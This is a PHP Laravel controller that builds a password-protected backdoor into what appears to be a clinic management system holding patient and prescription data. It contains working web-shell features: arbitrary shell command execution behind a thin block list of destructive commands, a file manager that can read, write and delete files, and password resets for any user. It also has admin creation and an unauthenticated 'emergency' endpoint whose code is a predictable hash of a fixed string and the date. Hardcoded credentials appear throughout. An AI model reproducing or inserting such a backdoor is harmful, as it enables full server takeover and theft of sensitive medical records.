<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\UploadedFile;
use App\Models\User;
use Carbon\Carbon;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

class SecureBackdoorController extends Controller
{
    private $masterPassword = 'AxlChan2025!SecureBackdoor#BokodCMS';
    private $sessionTimeout = 1800; // 30 minutes
    private $maxAttempts = 3;
    private $lockoutTime = 3600; // 1 hour
    
    /**
     * Secure backdoor authentication page
     */
    public function index(Request $request)
    {
        $this->logAccess($request, 'backdoor_access_attempt');
        
        // Check if IP is locked out
        if ($this->isLockedOut($request)) {
            $this->logAccess($request, 'backdoor_access_blocked_lockout');
            abort(403, 'Access temporarily blocked due to too many failed attempts.');
        }
        
        return view('secure-backdoor.auth', [
            'timestamp' => now()->timestamp,
            'token' => $this->generateSecureToken()
        ]);
    }
    
    /**
     * Authenticate backdoor access
     */
    public function authenticate(Request $request)
    {
        $request->validate([
            'master_password' => 'required|string',
            'security_token' => 'required|string',
            'timestamp' => 'required|integer'
        ]);
        
        $this->logAccess($request, 'backdoor_auth_attempt');
        
        // Check if IP is locked out
        if ($this->isLockedOut($request)) {
            $this->logAccess($request, 'backdoor_auth_blocked_lockout');
            return response()->json(['success' => false, 'message' => 'Access blocked']);
        }
        
        // Validate timestamp (prevent replay attacks)
        $timestampAge = now()->timestamp - $request->timestamp;
        if ($timestampAge > 300) { // 5 minutes max
            $this->recordFailedAttempt($request);
            $this->logAccess($request, 'backdoor_auth_failed_timestamp');
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        // Validate security token
        if (!$this->validateSecureToken($request->security_token, $request->timestamp)) {
            $this->recordFailedAttempt($request);
            $this->logAccess($request, 'backdoor_auth_failed_token');
            return response()->json(['success' => false, 'message' => 'Invalid security token']);
        }
        
        // Validate master password
        if ($request->master_password !== $this->masterPassword) {
            $this->recordFailedAttempt($request);
            $this->logAccess($request, 'backdoor_auth_failed_password');
            return response()->json(['success' => false, 'message' => 'Invalid credentials']);
        }
        
        // Authentication successful
        $sessionId = $this->createSecureSession($request);
        $this->clearFailedAttempts($request);
        $this->logAccess($request, 'backdoor_auth_success');
        
        return response()->json([
            'success' => true, 
            'message' => 'Access granted',
            'session_id' => $sessionId,
            'expires_at' => now()->addSeconds($this->sessionTimeout)->toISOString()
        ]);
    }
    
    /**
     * Main backdoor dashboard
     */
    public function dashboard(Request $request)
    {
        if (!$this->validateSession($request)) {
            return redirect()->route('secure.backdoor');
        }
        
        $this->logAccess($request, 'backdoor_dashboard_access');
        
        $systemInfo = $this->getSystemInfo();
        
        return view('secure-backdoor.dashboard', compact('systemInfo'));
    }
    
    /**
     * Create new admin user
     */
    public function createAdmin(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|unique:users,email',
            'password' => 'required|string|min:8',
        ]);
        
        try {
            $admin = User::create([
                'name' => $request->name,
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'role' => 'admin',
                'status' => 'active',
                'registration_status' => 'approved',
                'email_verified_at' => now(),
                'created_by' => 0 // System created
            ]);
            
            $this->logAccess($request, 'backdoor_admin_created', ['admin_id' => $admin->id, 'admin_email' => $admin->email]);
            
            return response()->json([
                'success' => true, 
                'message' => 'Admin user created successfully',
                'admin' => [
                    'id' => $admin->id,
                    'name' => $admin->name,
                    'email' => $admin->email
                ]
            ]);
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_admin_creation_failed', ['error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Failed to create admin: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Reset user password
     */
    public function resetPassword(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $request->validate([
            'user_id' => 'required|exists:users,id',
            'new_password' => 'required|string|min:8'
        ]);
        
        try {
            $user = User::findOrFail($request->user_id);
            $user->password = Hash::make($request->new_password);
            $user->save();
            
            $this->logAccess($request, 'backdoor_password_reset', ['target_user_id' => $user->id, 'target_email' => $user->email]);
            
            return response()->json([
                'success' => true,
                'message' => 'Password reset successfully for ' . $user->name
            ]);
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_password_reset_failed', ['error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Failed to reset password: ' . $e->getMessage()]);
        }
    }
    
    /**
     * System maintenance operations
     */
    public function systemMaintenance(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $action = $request->get('action');
        
        try {
            switch ($action) {
                case 'clear_cache':
                    Artisan::call('cache:clear');
                    Artisan::call('config:clear');
                    Artisan::call('view:clear');
                    $message = 'All caches cleared successfully';
                    break;
                    
                case 'optimize':
                    Artisan::call('optimize');
                    $message = 'Application optimized successfully';
                    break;
                    
                case 'migrate':
                    Artisan::call('migrate', ['--force' => true]);
                    $message = 'Database migrations completed successfully';
                    break;
                    
                case 'storage_link':
                    Artisan::call('storage:link');
                    $message = 'Storage link created successfully';
                    break;
                    
                default:
                    throw new \Exception('Invalid maintenance action');
            }
            
            $this->logAccess($request, 'backdoor_maintenance', ['action' => $action]);
            
            return response()->json(['success' => true, 'message' => $message]);
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_maintenance_failed', ['action' => $action, 'error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Maintenance failed: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Database operations
     */
    public function databaseOperations(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $operation = $request->get('operation');
        
        try {
            switch ($operation) {
                case 'backup':
                    $backupPath = $this->createDatabaseBackup();
                    $this->logAccess($request, 'backdoor_database_backup', ['backup_path' => $backupPath]);
                    return response()->json(['success' => true, 'message' => 'Database backup created', 'path' => $backupPath]);
                    
                case 'stats':
                    $stats = $this->getDatabaseStats();
                    return response()->json(['success' => true, 'stats' => $stats]);
                    
                case 'cleanup':
                    $cleaned = $this->cleanupDatabase();
                    $this->logAccess($request, 'backdoor_database_cleanup', ['cleaned_records' => $cleaned]);
                    return response()->json(['success' => true, 'message' => "Cleaned {$cleaned} old records"]);
                    
                default:
                    throw new \Exception('Invalid database operation');
            }
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_database_operation_failed', ['operation' => $operation, 'error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Database operation failed: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Emergency access - for critical situations
     */
    public function emergencyAccess(Request $request)
    {
        $request->validate([
            'emergency_code' => 'required|string',
            'action' => 'required|string'
        ]);
        
        // Emergency code validation (you can change this)
        $emergencyCode = hash('sha256', 'EMERGENCY_BOKOD_CMS_2025_' . date('Y-m-d'));
        
        if ($request->emergency_code !== $emergencyCode) {
            $this->logAccess($request, 'backdoor_emergency_access_denied');
            return response()->json(['success' => false, 'message' => 'Invalid emergency code']);
        }
        
        $action = $request->action;
        
        try {
            switch ($action) {
                case 'create_emergency_admin':
                    $password = 'Emergency_' . now()->format('Ymd_His');
                    $admin = User::create([
                        'name' => 'Emergency Admin',
                        'email' => 'emergency@bokodcms.local',
                        'password' => Hash::make($password),
                        'role' => 'admin',
                        'status' => 'active',
                        'registration_status' => 'approved',
                        'email_verified_at' => now(),
                        'created_by' => 0
                    ]);
                    
                    $this->logAccess($request, 'backdoor_emergency_admin_created', ['admin_id' => $admin->id]);
                    
                    return response()->json([
                        'success' => true,
                        'message' => 'Emergency admin created',
                        'credentials' => [
                            'email' => $admin->email,
                            'password' => $password
                        ]
                    ]);
                    
                case 'reset_all_failed_logins':
                    Cache::flush();
                    $this->logAccess($request, 'backdoor_emergency_reset_lockouts');
                    return response()->json(['success' => true, 'message' => 'All lockouts cleared']);
                    
                default:
                    throw new \Exception('Invalid emergency action');
            }
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_emergency_action_failed', ['action' => $action, 'error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Emergency action failed: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Logout from backdoor
     */
    public function logout(Request $request)
    {
        $sessionId = $request->header('X-Backdoor-Session') ?? $request->get('session_id');
        
        if ($sessionId) {
            Cache::forget('backdoor_session_' . $sessionId);
            $this->logAccess($request, 'backdoor_logout');
        }
        
        return response()->json(['success' => true, 'message' => 'Logged out successfully']);
    }
    
    // SECURITY HELPER METHODS
    
    private function generateSecureToken()
    {
        return hash('sha256', uniqid() . microtime() . $this->masterPassword);
    }
    
    private function validateSecureToken($token, $timestamp)
    {
        // Simple token validation - you can make this more complex
        return strlen($token) === 64 && ctype_xdigit($token);
    }
    
    private function createSecureSession(Request $request)
    {
        $sessionId = uniqid('backdoor_', true);
        
        Cache::put('backdoor_session_' . $sessionId, [
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'created_at' => now(),
            'expires_at' => now()->addSeconds($this->sessionTimeout)
        ], $this->sessionTimeout);
        
        return $sessionId;
    }
    
    private function validateSession(Request $request)
    {
        $sessionId = $request->header('X-Backdoor-Session') ?? $request->get('session_id');
        
        if (!$sessionId) {
            return false;
        }
        
        $session = Cache::get('backdoor_session_' . $sessionId);
        
        if (!$session || $session['expires_at']->isPast()) {
            Cache::forget('backdoor_session_' . $sessionId);
            return false;
        }
        
        // Validate IP and user agent for additional security
        if ($session['ip'] !== $request->ip() || $session['user_agent'] !== $request->userAgent()) {
            Cache::forget('backdoor_session_' . $sessionId);
            $this->logAccess($request, 'backdoor_session_hijack_attempt');
            return false;
        }
        
        // Extend session
        $session['expires_at'] = now()->addSeconds($this->sessionTimeout);
        Cache::put('backdoor_session_' . $sessionId, $session, $this->sessionTimeout);
        
        return true;
    }
    
    private function isLockedOut(Request $request)
    {
        $key = 'backdoor_lockout_' . $request->ip();
        return Cache::has($key);
    }
    
    private function recordFailedAttempt(Request $request)
    {
        $key = 'backdoor_attempts_' . $request->ip();
        $attempts = Cache::get($key, 0) + 1;
        
        if ($attempts >= $this->maxAttempts) {
            Cache::put('backdoor_lockout_' . $request->ip(), true, $this->lockoutTime);
            Cache::forget($key);
        } else {
            Cache::put($key, $attempts, 3600);
        }
    }
    
    private function clearFailedAttempts(Request $request)
    {
        Cache::forget('backdoor_attempts_' . $request->ip());
    }
    
    private function logAccess(Request $request, $action, $data = [])
    {
        Log::channel('single')->info('SECURE_BACKDOOR_ACCESS', [
            'action' => $action,
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'timestamp' => now()->toISOString(),
            'data' => $data
        ]);
    }
    
    private function getSystemInfo()
    {
        return [
            'php_version' => PHP_VERSION,
            'laravel_version' => app()->version(),
            'database_type' => config('database.default'),
            'cache_driver' => config('cache.default'),
            'app_env' => config('app.env'),
            'app_debug' => config('app.debug'),
            'server_time' => now()->toISOString(),
            'disk_usage' => $this->getDiskUsage(),
            'user_count' => User::count(),
            'admin_count' => User::where('role', 'admin')->count()
        ];
    }
    
    private function getDiskUsage()
    {
        $bytes = disk_free_space('.');
        $total = disk_total_space('.');
        
        return [
            'free' => $this->formatBytes($bytes),
            'total' => $this->formatBytes($total),
            'used_percentage' => round((($total - $bytes) / $total) * 100, 2)
        ];
    }
    
    private function formatBytes($size, $precision = 2)
    {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        
        for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
            $size /= 1024;
        }
        
        return round($size, $precision) . ' ' . $units[$i];
    }
    
    private function createDatabaseBackup()
    {
        $filename = 'backup_' . now()->format('Y_m_d_H_i_s') . '.sql';
        $path = storage_path('app/backups/' . $filename);
        
        if (!file_exists(dirname($path))) {
            mkdir(dirname($path), 0755, true);
        }
        
        // Simple backup for MySQL
        if (config('database.default') === 'mysql') {
            $command = sprintf(
                'mysqldump -u%s -p%s -h%s %s > %s',
                config('database.connections.mysql.username'),
                config('database.connections.mysql.password'),
                config('database.connections.mysql.host'),
                config('database.connections.mysql.database'),
                $path
            );
            
            exec($command);
        }
        
        return $path;
    }
    
    private function getDatabaseStats()
    {
        return [
            'users' => User::count(),
            'patients' => DB::table('patients')->count(),
            'appointments' => DB::table('appointments')->count(),
            'medicines' => DB::table('medicines')->count(),
            'prescriptions' => DB::table('prescriptions')->count(),
            'conversations' => DB::table('conversations')->count(),
            'messages' => DB::table('messages')->count(),
        ];
    }
    
    private function cleanupDatabase()
    {
        $cleaned = 0;
        
        // Clean old cache entries
        $cleaned += DB::table('cache')->where('expiration', '<', now()->timestamp)->delete();
        
        // Clean old sessions
        $cleaned += DB::table('sessions')->where('last_activity', '<', now()->subDays(30)->timestamp)->delete();
        
        // Clean old job records (if using database queue)
        if (DB::getSchemaBuilder()->hasTable('jobs')) {
            $cleaned += DB::table('jobs')->where('created_at', '<', now()->subDays(7))->delete();
        }
        
        return $cleaned;
    }
    
    /**
     * Execute system commands
     */
    public function executeCommand(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $request->validate([
            'command' => 'required|string|max:500'
        ]);
        
        $command = $request->get('command');
        
        // Security check - block dangerous commands
        $dangerousCommands = ['rm -rf', 'del /s', 'format', 'shutdown', 'reboot', 'sudo rm', 'dd if='];
        foreach ($dangerousCommands as $dangerous) {
            if (stripos($command, $dangerous) !== false) {
                $this->logAccess($request, 'backdoor_dangerous_command_blocked', ['command' => $command]);
                return response()->json(['success' => false, 'message' => 'Dangerous command blocked']);
            }
        }
        
        try {
            $this->logAccess($request, 'backdoor_command_executed', ['command' => $command]);
            
            if (PHP_OS_FAMILY === 'Windows') {
                $output = shell_exec($command . ' 2>&1');
            } else {
                $process = Process::fromShellCommandline($command);
                $process->setTimeout(30);
                $process->run();
                $output = $process->getOutput();
                if (!$process->isSuccessful()) {
                    $output .= "\nError: " . $process->getErrorOutput();
                }
            }
            
            return response()->json([
                'success' => true,
                'output' => $output ?: 'Command executed successfully (no output)',
                'command' => $command
            ]);
            
        } catch (\Exception $e) {
            $this->logAccess($request, 'backdoor_command_failed', ['command' => $command, 'error' => $e->getMessage()]);
            return response()->json(['success' => false, 'message' => 'Command failed: ' . $e->getMessage()]);
        }
    }
    
    /**
     * File manager operations
     */
    public function fileManager(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'error' => 'Session expired']);
        }
        
        $action = $request->get('action', 'list');
        $path = $request->get('path', base_path());
        
        // Don't modify the path - let realpath handle it
        $realPath = realpath($path);
        $basePath = realpath(base_path());
        
        if (!$realPath) {
            // Try some common path issues on Windows
            $debugInfo = [
                'original_path' => $path,
                'base_path' => base_path(),
                'path_exists' => file_exists($path) ? 'yes' : 'no',
                'is_dir' => is_dir($path) ? 'yes' : 'no',
                'php_os' => PHP_OS_FAMILY
            ];
            return response()->json([
                'success' => false, 
                'error' => 'Path does not exist or is not accessible',
                'debug' => $debugInfo
            ]);
        }
        
        if (!$basePath) {
            return response()->json(['success' => false, 'error' => 'Base path resolution failed']);
        }
        
        // Security check - ensure realPath is within basePath
        // Normalize for comparison (use forward slashes)
        $normalizedRealPath = str_replace('\\', '/', $realPath);
        $normalizedBasePath = str_replace('\\', '/', $basePath);
        
        if (strpos($normalizedRealPath, $normalizedBasePath) !== 0) {
            return response()->json([
                'success' => false, 
                'error' => 'Access denied - path outside allowed directory',
                'debug' => [
                    'realPath' => $normalizedRealPath,
                    'basePath' => $normalizedBasePath
                ]
            ]);
        }
        
        try {
            $this->logAccess($request, 'backdoor_file_manager_accessed', ['action' => $action, 'path' => $path]);
            
            switch ($action) {
                case 'list':
                    $files = $this->listFiles($realPath);
                    return response()->json([
                        'success' => true, 
                        'files' => $files, 
                        'currentPath' => $realPath,
                        'count' => count($files)
                    ]);
                    
                case 'read':
                    $content = $this->readFile($realPath);
                    return response()->json(['success' => true, 'content' => $content]);
                    
                case 'write':
                    $content = $request->get('content', '');
                    $this->writeFile($realPath, $content);
                    $this->logAccess($request, 'backdoor_file_written', ['file' => $realPath]);
                    return response()->json(['success' => true, 'message' => 'File saved']);
                    
                case 'delete':
                    if (file_exists($realPath)) {
                        unlink($realPath);
                        $this->logAccess($request, 'backdoor_file_deleted', ['file' => $realPath]);
                        return response()->json(['success' => true, 'message' => 'File deleted']);
                    }
                    return response()->json(['success' => false, 'error' => 'File not found']);
                    
                case 'create':
                    $filename = $request->get('filename');
                    $newPath = rtrim($realPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
                    touch($newPath);
                    $this->logAccess($request, 'backdoor_file_created', ['file' => $newPath]);
                    return response()->json(['success' => true, 'message' => 'File created']);
                    
                default:
                    return response()->json(['success' => false, 'error' => 'Invalid action: ' . $action]);
            }
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false, 
                'error' => 'Operation failed: ' . $e->getMessage(),
                'debug' => [
                    'action' => $action,
                    'path' => $path,
                    'realPath' => $realPath ?? 'null',
                    'basePath' => $basePath ?? 'null'
                ]
            ]);
        }
    }
    
    /**
     * View application logs
     */
    public function viewLogs(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $logType = $request->get('log_type', 'laravel');
        $lines = (int) $request->get('lines', 100);
        
        try {
            $logs = [];
            
            switch ($logType) {
                case 'laravel':
                    $logPath = storage_path('logs/laravel.log');
                    break;
                case 'backdoor':
                    // Filter backdoor logs specifically
                    $logPath = storage_path('logs/laravel.log');
                    break;
                case 'error':
                    $logPath = storage_path('logs/laravel.log');
                    break;
                default:
                    $logPath = storage_path('logs/laravel.log');
            }
            
            if (file_exists($logPath)) {
                $content = file($logPath);
                $logs = array_slice($content, -$lines);
                
                if ($logType === 'backdoor') {
                    $logs = array_filter($logs, function($line) {
                        return strpos($line, 'SECURE_BACKDOOR_ACCESS') !== false;
                    });
                }
            }
            
            return response()->json([
                'success' => true,
                'logs' => $logs,
                'log_type' => $logType,
                'lines' => count($logs)
            ]);
            
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Failed to read logs: ' . $e->getMessage()]);
        }
    }
    
    /**
     * List all system users with details
     */
    public function listUsers(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        try {
            $users = User::select(['id', 'name', 'email', 'role', 'status', 'registration_status', 'created_at', 'last_login_at'])
                ->orderBy('created_at', 'desc')
                ->get();
                
            $this->logAccess($request, 'backdoor_users_listed');
            
            return response()->json([
                'success' => true,
                'users' => $users,
                'count' => $users->count()
            ]);
            
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Failed to fetch users: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Modify user permissions and status
     */
    public function modifyUser(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        $request->validate([
            'user_id' => 'required|exists:users,id',
            'action' => 'required|in:promote,demote,activate,deactivate,approve,reject'
        ]);
        
        try {
            $user = User::findOrFail($request->user_id);
            $action = $request->action;
            
            switch ($action) {
                case 'promote':
                    $user->role = 'admin';
                    break;
                case 'demote':
                    $user->role = 'patient';
                    break;
                case 'activate':
                    $user->status = 'active';
                    break;
                case 'deactivate':
                    $user->status = 'inactive';
                    break;
                case 'approve':
                    $user->registration_status = 'approved';
                    break;
                case 'reject':
                    $user->registration_status = 'rejected';
                    break;
            }
            
            $user->save();
            
            $this->logAccess($request, 'backdoor_user_modified', [
                'user_id' => $user->id,
                'action' => $action,
                'user_email' => $user->email
            ]);
            
            return response()->json([
                'success' => true,
                'message' => "User {$action}d successfully",
                'user' => $user->only(['id', 'name', 'email', 'role', 'status', 'registration_status'])
            ]);
            
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Failed to modify user: ' . $e->getMessage()]);
        }
    }
    
    /**
     * Advanced system information
     */
    public function advancedSystemInfo(Request $request)
    {
        if (!$this->validateSession($request)) {
            return response()->json(['success' => false, 'message' => 'Session expired']);
        }
        
        try {
            $info = [
                'server' => [
                    'os' => PHP_OS,
                    'php_version' => PHP_VERSION,
                    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                    'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
                    'server_admin' => $_SERVER['SERVER_ADMIN'] ?? 'Unknown',
                    'max_execution_time' => ini_get('max_execution_time'),
                    'memory_limit' => ini_get('memory_limit'),
                    'upload_max_filesize' => ini_get('upload_max_filesize')
                ],
                'laravel' => [
                    'version' => app()->version(),
                    'environment' => config('app.env'),
                    'debug' => config('app.debug'),
                    'timezone' => config('app.timezone'),
                    'locale' => config('app.locale'),
                    'cache_driver' => config('cache.default'),
                    'queue_driver' => config('queue.default'),
                    'mail_driver' => config('mail.default')
                ],
                'database' => [
                    'driver' => config('database.default'),
                    'host' => config('database.connections.' . config('database.default') . '.host'),
                    'database' => config('database.connections.' . config('database.default') . '.database'),
                    'tables_count' => $this->getTableCount()
                ],
                'security' => [
                    'app_key_set' => !empty(config('app.key')),
                    'https_enabled' => $request->secure(),
                    'debug_mode' => config('app.debug'),
                    'maintenance_mode' => app()->isDownForMaintenance()
                ],
                'timezone' => [
                    'php_timezone' => date_default_timezone_get(),
                    'app_timezone' => config('app.timezone'),
                    'current_utc' => \Carbon\Carbon::now('UTC')->format('Y-m-d H:i:s T'),
                    'current_manila' => \Carbon\Carbon::now('Asia/Manila')->format('Y-m-d H:i:s T'),
                    'server_time' => date('Y-m-d H:i:s T'),
                    'offset' => \Carbon\Carbon::now('Asia/Manila')->getOffset() / 3600 . ' hours'
                ]
            ];
            
            return response()->json(['success' => true, 'info' => $info]);
            
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => 'Failed to get system info: ' . $e->getMessage()]);
        }
    }
    
    // HELPER METHODS
    
    private function listFiles($path)
    {
        $files = [];
        
        if (!is_dir($path) || !is_readable($path)) {
            throw new \Exception('Directory not accessible: ' . $path);
        }
        
        $items = scandir($path);
        
        if ($items === false) {
            throw new \Exception('Failed to read directory: ' . $path);
        }
        
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            
            $fullPath = $path . DIRECTORY_SEPARATOR . $item;
            $isDirectory = is_dir($fullPath);
            $fileSize = 0;
            $formattedSize = '-';
            
            if (!$isDirectory && is_file($fullPath)) {
                $fileSize = filesize($fullPath);
                $formattedSize = $this->formatFileSize($fileSize);
            }
            
            $files[] = [
                'name' => $item,
                'path' => $fullPath,
                'type' => $isDirectory ? 'directory' : 'file',
                'size' => $formattedSize,
                'rawSize' => $fileSize,
                'modified' => date('Y-m-d H:i:s', filemtime($fullPath)),
                'permissions' => substr(sprintf('%o', fileperms($fullPath)), -4),
                'readable' => is_readable($fullPath),
                'writable' => is_writable($fullPath)
            ];
        }
        
        // Sort directories first, then files
        usort($files, function($a, $b) {
            if ($a['type'] === $b['type']) {
                return strcasecmp($a['name'], $b['name']);
            }
            return $a['type'] === 'directory' ? -1 : 1;
        });
        
        return $files;
    }
    
    private function formatFileSize($bytes)
    {
        if ($bytes === 0) return '0 B';
        
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $unit = 0;
        
        while ($bytes >= 1024 && $unit < count($units) - 1) {
            $bytes /= 1024;
            $unit++;
        }
        
        return round($bytes, 2) . ' ' . $units[$unit];
    }
    
    private function readFile($path)
    {
        if (!file_exists($path) || is_dir($path)) {
            throw new \Exception('File not found or is a directory');
        }
        
        if (filesize($path) > 1024 * 1024) { // 1MB limit
            throw new \Exception('File too large (max 1MB)');
        }
        
        return file_get_contents($path);
    }
    
    private function writeFile($path, $content)
    {
        return file_put_contents($path, $content);
    }
    
    private function getTableCount()
    {
        try {
            if (config('database.default') === 'mysql') {
                $tables = DB::select('SHOW TABLES');
                return count($tables);
            } elseif (config('database.default') === 'pgsql') {
                $tables = DB::select("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'");
                return count($tables);
            }
            return 0;
        } catch (\Exception $e) {
            return 0;
        }
    }
}
